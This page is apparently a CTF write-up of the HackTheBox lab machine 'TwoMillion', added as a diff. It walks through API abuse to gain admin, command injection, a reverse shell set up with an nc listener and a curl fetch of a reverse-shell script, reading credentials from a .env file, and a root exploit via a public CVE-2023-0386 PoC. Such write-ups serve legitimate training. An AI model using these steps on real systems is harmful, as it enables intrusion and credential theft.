@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>HackTheBox Writeup Template</title>
+
+  <meta name="description" content="Writeup HackTheBox Template">
+  <meta name="author" content="Bruno-1337">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Template">
+  <meta name="twitter:description" content="Writeup HackTheBox Template">
+  <meta name="twitter:creator" content="Bruno-1337">  
+  <meta name="twitter:image" content="https://www.hackthebox.com/storage/avatars/d7bc2758fb7589dfa046bee9ce4d75cb.png" />
+
+  <meta property="og:site_name" content="Bruno-1337" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Template">
+  <meta property="og:description" content="Writeup HackTheBox Template">
+  <meta property="og:image" content="https://www.hackthebox.com/storage/avatars/d7bc2758fb7589dfa046bee9ce4d75cb.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://www.hackthebox.com/storage/avatars/d7bc2758fb7589dfa046bee9ce4d75cb.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup TwoMillion" href="/feed.xml">
+</head>
+
+
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.gif)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.gif" class="user-image zoomable" alt="Bruno-1337">
+          <h1 class="panel-cover__title panel-title scale-up-center">Bruno 1337</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">CTF Writeups</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="HackTheBox_Writeups" class="blog-button">HackTheBox Writeups</a></li>
+              <li class="navigation__item grow"><a href="/" title="Home" class="blog-button">Home</a></li>
+            </ul>
+          </nav>
+
+          
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+             <li class="navigation__item grow">
+                <a href="https://github.com/bruno-1337" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/brunobadaro" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+              
+              <li class="navigation__item grow">
+                <a href="mailto:bruno@waifu.club" title="Emai" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+    
+  </div>
+
+  <header class="post-header slide-top">
+   
+    <head>
+<style>
+body {
+  background-color: #000000;
+  color: #FFFFFF;
+  font-family: Calibri, Sans Serif;
+}
+
+.darkMode{
+  background-color: #ffffff;
+  color: #000000;
+}
+
+</style>
+</head>
+<body>
+<button id="darkModeToggle">☀️ Light Mode</button>
+
+
+<script>
+  const darkModeToggle = document.querySelector('#darkModeToggle');
+  
+  darkModeToggle.addEventListener('click', () => {
+    document.body.classList.toggle('darkMode')
+  })
+  
+</script>
+
+</body>
+    <br>
+    <picture><img src="https://www.hackthebox.com/storage/avatars/d7bc2758fb7589dfa046bee9ce4d75cb.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+   
+  </header>
+
+
+<br>
+<br>          
+<h1 id="HackTheBox-template-writeup">HTB - TwoMillion</h1>
+<p>This is a writeup/walkthrough of the Hack the Box machine "TwoMillion" by TRX and TheCyberGeek</p>
+<p><img src="img/banner.png" alt=""></p> <!--foto do lab-->
+<p>Machine Link :  <a href="https://app.hackthebox.com/machines/TwoMillion">https://app.hackthebox.com/machines/TwoMillion</a></p>
+<p>Machine IP : 10.10.11.221</p>
+<h1 id="-prerequisites-"><strong>Enumeration</strong></h1>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+  <code><span class="ve">❯ command </span><span class="p">used
+  sudo nmap -sV -sC -o nmap 10.10.11.221
+    </span>
+</code></pre></div></div><br> 
+<p><img src="img/nmap.png" alt=""></p>
+<p><strong>Scan Result:</strong></p>
+<p>22 tcp open port for ssh</p>
+<p>80 tcp open port for http</p>
+<p>Nothing out of the ordinary, so lets navigate to the website</p>
+
+<p><strong>Browsing website:</strong></p>
+<p>After adding the line 10.10.11.221 2million.htb to our hosts file we can see the webpage</p>
+<p><img src="img/websitefirstlook.png" alt=""></p>
+<p>It looks like an old version of the hackthebox website, after trying to interact with the website i tried to create an account and it asks for a invite code</p>
+<p><strong>Endpoint: </strong>2million.htb/invite</p>
+<p><img src="img/challenge.png" alt=""></p>
+<p>Reading the js file of the page i found the function makeInviteCode()</p>
+<div style="overflow:auto;position:relative;margin-bottom: 1em;background:#151515;color:#d0d0d0;font-family:Monaco,Consolas,monospace;font-size:1.0em;line-height:1.8;border-radius:4px;"><pre style="background:#151515;border:none;"><span style="color:#d28445">function</span> <span style="color:#d0d0d0;background-color:#151515">makeInviteCode</span><span style="color:#d0d0d0">()</span> <span style="color:#d0d0d0">{</span>
+  <span style="color:#d0d0d0;background-color:#151515">$</span><span style="color:#d0d0d0">.</span><span style="color:#d0d0d0;background-color:#151515">ajax</span><span style="color:#d0d0d0">({</span>
+      <span style="color:#6a9fb5">type</span><span style="color:#d0d0d0">:</span> <span style="color:#90a959">"</span><span style="color:#90a959">POST</span><span style="color:#90a959">"</span><span style="color:#d0d0d0">,</span>
+      <span style="color:#6a9fb5">dataType</span><span style="color:#d0d0d0">:</span> <span style="color:#90a959">"</span><span style="color:#90a959">json</span><span style="color:#90a959">"</span><span style="color:#d0d0d0">,</span>
+      <span style="color:#6a9fb5">url</span><span style="color:#d0d0d0">:</span> <span style="color:#90a959">'</span><span style="color:#90a959">/api/v1/invite/how/to/generate</span><span style="color:#90a959">'</span><span style="color:#d0d0d0">,</span>
+      <span style="color:#6a9fb5">success</span><span style="color:#d0d0d0">:</span> <span style="color:#d28445">function</span><span style="color:#d0d0d0">(</span><span style="color:#d0d0d0;background-color:#151515">response</span><span style="color:#d0d0d0">)</span> <span style="color:#d0d0d0">{</span>
+          <span style="color:#d0d0d0;background-color:#151515">console</span><span style="color:#d0d0d0">.</span><span style="color:#d0d0d0;background-color:#151515">log</span><span style="color:#d0d0d0">(</span><span style="color:#d0d0d0;background-color:#151515">response</span><span style="color:#d0d0d0">)</span>
+      <span style="color:#d0d0d0">},</span>
+      <span style="color:#6a9fb5">error</span><span style="color:#d0d0d0">:</span> <span style="color:#d28445">function</span><span style="color:#d0d0d0">(</span><span style="color:#d0d0d0;background-color:#151515">response</span><span style="color:#d0d0d0">)</span> <span style="color:#d0d0d0">{</span>
+          <span style="color:#d0d0d0;background-color:#151515">console</span><span style="color:#d0d0d0">.</span><span style="color:#d0d0d0;background-color:#151515">log</span><span style="color:#d0d0d0">(</span><span style="color:#d0d0d0;background-color:#151515">response</span><span style="color:#d0d0d0">)</span>
+      <span style="color:#d0d0d0">}</span>
+  <span style="color:#d0d0d0">})</span>
+<span style="color:#d0d0d0">}</span></pre></div>
+<p>Next i made the post request on the endpoint mentioned in the function</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+  <code><span class="ve">❯ command </span><span class="p">used
+  curl -X POST http://2million.htb/api/v1/invite/how/to/generate
+    </span>
+</code></pre></div></div><br> 
+<p>and got the following JSON response</p>
+<div style="overflow:auto;position:relative;margin-bottom: 1em;background:#151515;color:#d0d0d0;font-family:Monaco,Consolas,monospace;font-size:1.0em;line-height:1.8;border-radius:4px;"><pre style="background:#151515;border:none;"><span style="color:#d0d0d0">{</span><span style="color:#d0d0d0;background-color:#151515">
+</span><span style="color:#d0d0d0;background-color:#151515">"0"</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0;background-color:#151515"> </span><span style="color:#90a959">200</span><span style="color:#d0d0d0">,</span><span style="color:#d0d0d0;background-color:#151515">
+</span><span style="color:#d0d0d0;background-color:#151515">"success"</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0;background-color:#151515"> </span><span style="color:#90a959">1</span><span style="color:#d0d0d0">,</span><span style="color:#d0d0d0;background-color:#151515">
+</span><span style="color:#d0d0d0;background-color:#151515">"data"</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0;background-color:#151515"> </span><span style="color:#d0d0d0">{</span><span style="color:#d0d0d0;background-color:#151515">
+  </span><span style="color:#d0d0d0;background-color:#151515">"data"</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0;background-color:#151515"> </span><span style="color:#90a959">"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"</span><span style="color:#d0d0d0">,</span><span style="color:#d0d0d0;background-color:#151515">
+  </span><span style="color:#d0d0d0;background-color:#151515">"enctype"</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0;background-color:#151515"> </span><span style="color:#90a959">"ROT13"</span><span style="color:#d0d0d0;background-color:#151515">
+</span><span style="color:#d0d0d0">},</span><span style="color:#d0d0d0;background-color:#151515">
+</span><span style="color:#d0d0d0;background-color:#151515">"hint"</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0;background-color:#151515"> </span><span style="color:#90a959">"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."</span><span style="color:#d0d0d0;background-color:#151515">
+</span><span style="color:#d0d0d0">}</span></pre></div>
+<p>after decoding the message with <a href="https://gchq.github.io/CyberChef/">CyberChef</a> using the ROT13 Cypher that specified on the JSON respose we get the message:</p>
+<p><strong>In order to generate the invite code, make a POST request to /api/v1/invite/generate</strong></p>
+<p>After making the POST request we are greeted with the reply</p>
+<div style="overflow:auto;position:relative;margin-bottom: 1em;background:#151515;color:#d0d0d0;font-family:Monaco,Consolas,monospace;font-size:1.0em;line-height:1.8;border-radius:4px;"><pre style="background:#151515;border:none;"><span style="color:#d0d0d0">{</span><span style="color:#d0d0d0;background-color:#151515">
+</span><span style="color:#d0d0d0;background-color:#151515">"0"</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0;background-color:#151515"> </span><span style="color:#90a959">200</span><span style="color:#d0d0d0">,</span><span style="color:#d0d0d0;background-color:#151515">
+</span><span style="color:#d0d0d0;background-color:#151515">"success"</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0;background-color:#151515"> </span><span style="color:#90a959">1</span><span style="color:#d0d0d0">,</span><span style="color:#d0d0d0;background-color:#151515">
+</span><span style="color:#d0d0d0;background-color:#151515">"data"</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0;background-color:#151515"> </span><span style="color:#d0d0d0">{</span><span style="color:#d0d0d0;background-color:#151515">
+  </span><span style="color:#d0d0d0;background-color:#151515">"code"</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0;background-color:#151515"> </span><span style="color:#90a959">"NVpBR0ctOFVHOVEtVFA5U1EtTEVMMjU="</span><span style="color:#d0d0d0">,</span><span style="color:#d0d0d0;background-color:#151515">
+  </span><span style="color:#d0d0d0;background-color:#151515">"format"</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0;background-color:#151515"> </span><span style="color:#90a959">"encoded"</span><span style="color:#d0d0d0;background-color:#151515">
+</span><span style="color:#d0d0d0">}</span><span style="color:#d0d0d0;background-color:#151515">
+</span><span style="color:#d0d0d0">}</span></pre></div>
+<p>At first glance we can see that the code is base64 encoded, after decoding it we get the invite code</p>
+<p><img src="img/invitecode.png" alt=""></p>
+<p>after seeing that our invite code is valid we proceed to create a account</p>
+
+<p>after some enumeration we find that the only link that really works is the Access page, with the endpoint <strong>/home/access</strong></p>
+
+<p>the button Connection Pack and Regenerate both lead to api endpoints, so i tried to fuzz the api and when sending a GET request to /api/v1 it returned all the API endpoints </p>
+<p><img src="img/apiendpoints.png" alt=""></p>
+<p>after trying out the API i found that the endpoint <strong>/api/v1/admin/settings/update</strong> let us set any user as admin, so we proceeded to do that</p>
+<p><img src="img/adminreq.png" alt=""></p>
+<p>then we proceed to try to use the other API endpoints, and when looking at <strong>/api/v1/admin/vpn/generate</strong> we find that the request is different than the previous generate API endpoint as it one asks for a username in json</p>
+<p>While trying to break the request to see if we find any error messages, if we use the following payload we get a remote code injection</p>
+<p><img src="img/rce.png" alt=""></p>
+<p>we proceed to setup a reverse shell with <a href="https://reverse-shell.sh">https://reverse-shell.sh</a></p>
+<p>and upload it with a python server</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+  <code><span class="ve">❯ command </span><span class="p">listener for the shell
+  nc -lnvp 1337
+    </span>
+</code></pre></div></div><br> 
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+  <code><span class="ve">❯ command </span><span class="p">used to download the shell script then serve to the target
+  curl https://reverse-shell/myip:port > shell.sh
+
+  python -m http.server 8000
+    </span>
+</code></pre></div></div><br> 
+
+<p><img src="img/downloadingshell.png" alt=""></p>
+<p><img src="img/servingshell.png" alt=""></p>
+<p><img src="img/downloadshellpayload.png" alt=""></p>
+
+<p>and we have a shell!!!</p>
+<p>we proceed to upgrade our shell with</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+  <code>
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+  (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+    </span>
+</code></pre></div></div><br>
+<p>while enumerating the machine we find the file .env at /var/www/html and when reading the file we find some exposed credentials</p>
+<p><img src="img/exposedpassword.png" alt=""></p>
+<p>we proceed to connect on ssh using the exposed credentials and we are in!</p>
+<p><img src="img/userflagdone.png" alt=""></p>
+<h1 id="-prerequisites-"><strong>Privesc</strong></h1>
+<p>after login with ssh we see that we have a new email</p>
+<p><img src="img/newemail.png" alt=""></p>
+<p>with this hint we proceed to check our OS version</p>
+<p><img src="img/versions.png" alt=""></p>
+<p>after searching for a bit i found the CVE-2023-0386 and decided to use this <a href="https://github.com/xkaneiki/CVE-2023-0386">PoC</a></p>
+<p>after uploading it to the victim machine we do as the github says, first we compile it, then it says to open two terminals, to do that we use tmux to run the first batch of commands</p>
+<p><img src="img/tmux.png" alt=""></p>
+<p>then we hit ctrl+b then d and use the last command</p>
+<p><img src="img/wegotroot.png" alt=""></p>
+<p>We did it! we are root.</p>
+<p><img src="img/owned.png" alt=""></p>
+<h1 id="thanks-for-reading-">Thanks For Reading.</h1>
+
+
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - Bruno-1337</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
